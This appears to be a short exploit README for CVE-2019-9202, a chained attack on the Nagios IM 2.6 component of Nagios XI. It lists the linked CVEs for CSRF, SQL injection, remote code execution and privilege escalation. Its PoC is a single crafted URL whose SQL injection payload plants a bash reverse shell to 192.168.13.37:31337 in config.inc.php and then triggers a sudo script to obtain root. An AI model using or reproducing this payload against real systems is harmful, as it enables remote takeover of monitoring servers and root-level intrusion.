# CVE-2019-9202
Nagios IM 2.6 remote code execution exploit: CSRF + SQLi + RCE + LPE --> remote root

## Description
By chaining a Cross-Site Request Forgery (CSRF) / authorization bypass (CVE-2019-9203) it is possible to exploit a Union-based SQL injection (CVE-2019-9204), a Remote Code Execution (RCE) (CVE-2019-9202) and a Local Privilege Escalation (LPE) (CVE-2019-9166), obtaining root privileges on a remote Nagios XI server.

## Requirements
The victim must be authenticated in Nagios XI, afaik lowest privileges are enough.

## PoC
http://nagiosxi.local/nagiosxi/includes/components/nagiosim/nagiosim.php?mode=update&token=&incident_id='union%20select%201,2,3,4,"';echo%20%27print%28\"bash+-i+%3e%26+/dev/tcp/192.168.13.37/31337+0%3e%261+%23\"%29%3b'%3e%3e+/usr/local/nagiosxi/html/config.inc.php%3b+sudo+/usr/local/nagiosxi/scripts/repair_databases.sh%3b%23",6,7,8,'x
